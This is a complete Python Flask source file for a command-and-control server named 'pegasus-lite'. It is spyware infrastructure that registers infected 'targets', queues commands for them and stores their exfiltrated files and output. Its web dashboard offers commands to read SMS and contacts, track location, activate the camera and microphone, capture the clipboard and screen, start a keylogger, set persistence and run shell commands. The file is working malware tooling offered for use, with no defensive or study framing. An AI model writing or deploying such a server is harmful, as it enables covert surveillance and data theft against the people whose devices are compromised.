
---

**File: server/server.py**
```python
#!/usr/bin/env python3
# language: Python 3, file: server/server.py
# pegasus-lite C2 server — HTTP task queue, SQLite target store, file exfil, dashboard.
import os, sys, json, time, uuid, argparse, sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, Response

BASE = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE, 'uploads')
DB_PATH = os.path.join(BASE, 'c2.db')
os.makedirs(UPLOAD_DIR, exist_ok=True)

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024

def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = db()
    conn.executescript("""
    CREATE TABLE IF NOT EXISTS targets (
        id TEXT PRIMARY KEY,
        hostname TEXT, os TEXT, user TEXT, ip TEXT, arch TEXT, tags TEXT,
        first_seen REAL, last_seen REAL
    );
    CREATE TABLE IF NOT EXISTS tasks (
        id TEXT PRIMARY KEY, target_id TEXT, cmd TEXT, args TEXT,
        created REAL, delivered REAL, completed REAL,
        status TEXT DEFAULT 'pending'
    );
    CREATE TABLE IF NOT EXISTS results (
        id TEXT PRIMARY KEY, task_id TEXT, target_id TEXT,
        output TEXT, file_path TEXT, created REAL
    );
    """)
    conn.commit(); conn.close()

init_db()
def now(): return time.time()

DASHBOARD = r"""<!doctype html><html><head><meta charset=utf-8>
<title>pegasus-lite</title>
<style>
body{background:#0b0d10;color:#c8d0d8;font-family:monospace;margin:0;padding:20px}
h1{color:#6ee7b7;font-size:18px}
table{width:100%;border-collapse:collapse;margin-top:10px}
th,td{border:1px solid #1f2937;padding:6px;text-align:left;font-size:13px}
th{background:#111827;color:#9ca3af}
a{color:#60a5fa;text-decoration:none}
.cmd{margin:20px 0;padding:12px;border:1px solid #1f2937;background:#0f1216}
input,select,textarea{background:#0b0d10;color:#c8d0d8;border:1px solid #374151;padding:6px;font-family:monospace}
button{background:#065f46;color:#d1fae5;border:0;padding:8px 14px;cursor:pointer;font-family:monospace}
pre{background:#0f1216;border:1px solid #1f2937;padding:10px;overflow:auto;max-height:400px}
</style></head><body>
<h1>pegasus-lite C2</h1>
<div class=cmd>
<h3>Dispatch</h3>
<form id=f>
<select id=target name=target></select>
<select id=cmd name=cmd>
<option>sysinfo<option>shell<option>ls<option>download<option>upload
<option>sms<option>contacts<option>location<option>camera<option>mic
<option>clipboard<option>screenshot<option>persist<option>keylog_start
<option>keylog_stop<option>sleep
</select>
<input id=args name=args placeholder='{"path":"/sdcard"}' size=60>
<button>send</button>
</form>
<pre id=out></pre>
</div>
<h3>Targets</h3>
<table id=targets><thead><tr><th>id</th><th>host</th><th>os</th><th>user</th><th>ip</th><th>tags</th><th>last</th></tr></thead><tbody></tbody></table>
<h3>Results</h3>
<table id=results><thead><tr><th>time</th><th>target</th><th>cmd</th><th>output</th><th>file</th></tr></thead><tbody></tbody></table>
<script>
async function refresh(){
  const t=await (await fetch('/api/targets')).json();
  const sel=document.getElementById('target');
  const cur=sel.value;
  sel.innerHTML='';
  t.forEach(x=>{const o=document.createElement('option');o.value=x.id;o.text=x.hostname+' '+x.os;sel.appendChild(o)});
  if(cur)sel.value=cur;
  const tb=document.querySelector('#targets tbody');tb.innerHTML='';
  t.forEach(x=>{tb.innerHTML+=`<tr><td>${x.id.slice(0,8)}</td><td>${x.hostname}</td><td>${x.os}</td><td>${x.user}</td><td>${x.ip}</td><td>${x.tags}</td><td>${new Date(x.last_seen*1000).toLocaleTimeString()}</td></tr>`});
  const r=await (await fetch('/api/results')).json();
  const rb=document.querySelector('#results tbody');rb.innerHTML='';
  r.forEach(x=>{rb.innerHTML+=`<tr><td>${new Date(x.created*1000).toLocaleTimeString()}</td><td>${x.target_id.slice(0,8)}</td><td>${x.cmd||''}</td><td><pre>${(x.output||'').slice(0,500)}</pre></td><td>${x.file_path?`<a href=/files/${x.file_path}>file</a>`:''}</td></tr>`});
}
document.getElementById('f').onsubmit=async e=>{
  e.preventDefault();
  const body={target_id:target.value,cmd:cmd.value};
  try{body.args=JSON.parse(args.value||'{}')}catch{body.args={raw:args.value}}
  const r=await fetch('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
  document.getElementById('out').textContent=JSON.stringify(await r.json(),null,2);
  refresh();
};
refresh();setInterval(refresh,3000);
</script></body></html>"""

@app.route('/')
def index(): return Response(DASHBOARD, mimetype='text/html')

@app.route('/api/targets')
def api_targets():
    conn = db()
    rows = conn.execute("SELECT * FROM targets ORDER BY last_seen DESC").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])

@app.route('/api/results')
def api_results():
    conn = db()
    rows = conn.execute("""SELECT r.*, t.cmd FROM results r
                           LEFT JOIN tasks t ON r.task_id=t.id
                           ORDER BY r.created DESC LIMIT 200""").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])

@app.route('/api/task', methods=['POST'])
def api_task():
    d = request.get_json(force=True)
    tid = d.get('target_id'); cmd = d.get('cmd'); args = d.get('args', {})
    if not tid or not cmd: return jsonify({"error": "target_id and cmd required"}), 400
    task_id = str(uuid.uuid4())
    conn = db()
    conn.execute("INSERT INTO tasks (id,target_id,cmd,args,created) VALUES (?,?,?,?,?)",
                 (task_id, tid, cmd, json.dumps(args), now()))
    conn.commit(); conn.close()
    return jsonify({"ok": True, "task_id": task_id})

@app.route('/register', methods=['POST'])
def register():
    d = request.get_json(force=True)
    tid = d.get('target_id') or str(uuid.uuid4())
    conn = db()
    row = conn.execute("SELECT id FROM targets WHERE id=?", (tid,)).fetchone()
    if row:
        conn.execute("UPDATE targets SET last_seen=?, ip=? WHERE id=?",
                     (now(), request.remote_addr, tid))
    else:
        conn.execute("""INSERT INTO targets
            (id,hostname,os,user,ip,arch,tags,first_seen,last_seen)
            VALUES (?,?,?,?,?,?,?,?,?)""",
            (tid, d.get('hostname'), d.get('os'), d.get('user'),
             request.remote_addr, d.get('arch'), json.dumps(d.get('tags', [])),
             now(), now()))
    conn.commit(); conn.close()
    return jsonify({"target_id": tid, "poll_interval": 5})

@app.route('/task/<tid>')
def get_task(tid):
    conn = db()
    row = conn.execute("""SELECT * FROM tasks WHERE target_id=? AND status='pending'
                          ORDER BY created ASC LIMIT 1""", (tid,)).fetchone()
    if not row:
        conn.close(); return jsonify({"task": None})
    conn.execute("UPDATE tasks SET status='delivered', delivered=? WHERE id=?",
                 (now(), row['id']))
    conn.commit(); conn.close()
    return jsonify({"task": {"id": row['id'], "cmd": row['cmd'], "args": json.loads(row['args'])}})

@app.route('/result', methods=['POST'])
def result():
    tid = request.form.get('target_id') or request.headers.get('X-Target')
    task_id = request.form.get('task_id')
    output = request.form.get('output', '')
    file_path = None
    if 'file' in request.files:
        f = request.files['file']
        safe = os.path.basename(f.filename or 'file.bin')
        fname = f"{task_id}_{safe}"
        f.save(os.path.join(UPLOAD_DIR, fname))
        file_path = fname
    conn = db()
    conn.execute("""INSERT INTO results (id,task_id,target_id,output,file_path,created)
                    VALUES (?,?,?,?,?,?)""",
                 (str(uuid.uuid4()), task_id, tid, output, file_path, now()))
    conn.execute("UPDATE tasks SET status='completed', completed=? WHERE id=?",
                 (now(), task_id))
    conn.commit(); conn.close()
    return jsonify({"ok": True})

@app.route('/files/<path:name>')
def files(name):
    return send_from_directory(UPLOAD_DIR, name, as_attachment=True)

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--host', default='0.0.0.0')
    p.add_argument('--port', type=int, default=8080)
    a = p.parse_args()
    print(f"[c2] listening on {a.host}:{a.port}")
    app.run(host=a.host, port=a.port, threaded=True)
